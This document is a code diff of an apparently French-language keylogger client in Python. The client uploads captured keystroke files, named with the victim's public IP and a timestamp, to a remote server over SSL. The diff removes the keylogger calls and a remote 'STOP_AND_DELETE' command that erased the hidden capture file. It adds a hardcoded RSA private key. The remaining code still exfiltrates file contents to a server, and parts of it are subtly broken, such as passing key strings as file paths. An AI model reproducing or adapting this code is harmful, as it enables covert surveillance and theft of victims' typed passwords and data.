@@ -1,22 +1,34 @@
-import keylogger
 import socket
+import os
 import ssl
 import requests
-import time  
-import os  
+import time
 from datetime import datetime
 
-def generate_keys():
-    # Générer une paire de clés pour le client
-    os.system("openssl req -nodes -newkey rsa:2048 -keyout client_private_key.pem -out client_csr.pem")
-    os.system("openssl x509 -req -sha256 -days 365 -in client_csr.pem -signkey client_private_key.pem -out client_public_key.pem")
 
-# Générer les clés pour le client
-generate_keys()
-
-# Chemins des clés du client
-PRIVATE_KEY = "client_private_key.pem"
-PUBLIC_KEY = "client_public_key.pem"
+PRIVATE_KEY_CLIENT = """-----BEGIN RSA PRIVATE KEY-----
+MIICWwIBAAKBgHM9/fIcEDaQLk5F0N5BR009NGTFK2lmHSU7nLo7Y03BGgouoyXW
+GjakY+kRUuHrARXAjyJQJHB/XyZzwuDSOYMSAgKfpsBuuCO+qERX30jYKo/dz2K1
+K441iwX09xrlelj1gvSARte0oMj497RYogQU/JZ2G5uvHNkCfswF1r3TAgMBAAEC
+gYAKay9bRSg+FpjpIKy6e0Jb/E2RUrYTCFVYOWR4/ceDjxKwmvjLAelKyV/zAUrx
++9IUSl1mZ8JznUBX9J1IwBjM3l8gAQjX+52YeM8Q1AG+xR1Dl+SDYRuxffkKAds8
+l68OFsr4RUFSOvtDBT6QnbzerTsOTJcoRvTOv0V06Eg2IQJBAMbMzQoiaXIhcSpa
+b3sCUqjdKDlIhYfk57135ZRWXSmWSBsXm3g/MxRK9MQVgmOnXqJW0f6BVqDmJge7
+mU2u6tECQQCUZn3yzpF4AV8LDmBfzEsipC04az48Twy17IAgzQ1H8G7Kj1YVZfxS
+q+WNxxxMGym+GRtI62rxZB9LowBaAL9jAkAm42EonlqqLMiKVG6CTY4F4l0/92PH
+lYuPkKikP9Cxleg9BH0xJIvFaHRA90QuYkssznb9pidgCiVeVeBDRfhBAkAC1cJq
+NRAKXtxV9bxZmCmHS+OhREs4E7qGbzIzbjdmvG0haYOXfQ9I9Qe5oagkvBAcFZaz
+2et9GRCP/VkwXvtJAkEAmKLnxFQgw+nWYYVfkjbgvd4Uq2RaOUwhiL65qlR36lbQ
+Rbxo7Cm7Ypyb0EPixjLAmdL8r7k9AusrZIE2RbFnUw==
+-----END RSA PRIVATE KEY-----
+"""
+PUBLIC_KEY_CLIENT = """-----BEGIN PUBLIC KEY-----
+MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgHM9/fIcEDaQLk5F0N5BR009NGTF
+K2lmHSU7nLo7Y03BGgouoyXWGjakY+kRUuHrARXAjyJQJHB/XyZzwuDSOYMSAgKf
+psBuuCO+qERX30jYKo/dz2K1K441iwX09xrlelj1gvSARte0oMj497RYogQU/JZ2
+G5uvHNkCfswF1r3TAgMBAAE=
+-----END PUBLIC KEY-----
+"""
 
 # Fonction pour obtenir le nom du fichier avec l'adresse IP et la date
 def get_filename():
@@ -27,28 +39,6 @@ def get_filename():
     filename = public_ip + "-" + now.strftime("%d-%m-%Y-%H:%M:%S") + ".keyboard.txt"
     return filename
 
-# Fonction pour lancer le keylogger
-def launch_keylogger():
-    keylogger.listen_keyboard()
-
-# Fonction pour arrêter le keylogger
-def stop_keylogger():
-    # Arrêter le keylogger
-    keylogger.stop_keylogger()
-
-# Fonction pour arrêter le keylogger et supprimer le fichier de capture
-def stop_and_delete_capture_file():
-    # Arrêter le keylogger
-    stop_keylogger()
-
-    # Supprimer le fichier de capture
-    try:
-        file_path = ".document1.txt"  # Assurez-vous que c'est le bon chemin
-        os.remove(file_path)
-        print(f"Fichier {file_path} supprimé avec succès.")
-    except Exception as e:
-        print(f"Erreur lors de la suppression du fichier : {e}")
-
 # Fonction pour envoyer le fichier de manière sécurisée au serveur via une socket SSL
 def send_file_securely(file_path, server_address, server_port):
     # Créer une socket TCP
@@ -56,7 +46,7 @@ def send_file_securely(file_path, server_address, server_port):
 
     # Créer un contexte SSL
     context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-    context.load_cert_chain(certfile=PRIVATE_KEY, keyfile=PUBLIC_KEY)
+    context.load_cert_chain(certfile=PRIVATE_KEY_CLIENT, keyfile=PUBLIC_KEY_CLIENT)
 
     # Établir une connexion sécurisée avec le serveur
     secure_socket = context.wrap_socket(client_socket, server_hostname=server_address)
@@ -70,16 +60,9 @@ def send_file_securely(file_path, server_address, server_port):
         secure_socket.send(filename.encode())
 
         # Envoyer le contenu du fichier au serveur
-        with open(".document1.txt", "r") as file:
+        with open(file_path, "r") as file:
             file_data = file.read()
             secure_socket.sendall(file_data.encode())
-
-        # Recevoir l'ordre du serveur
-        order = secure_socket.recv(1024).decode()
-
-        # Si l'ordre est d'arrêter et supprimer le fichier
-        if order == "STOP_AND_DELETE":
-            stop_and_delete_capture_file()
 
         print("Fichier envoyé avec succès.")
     except Exception as e:
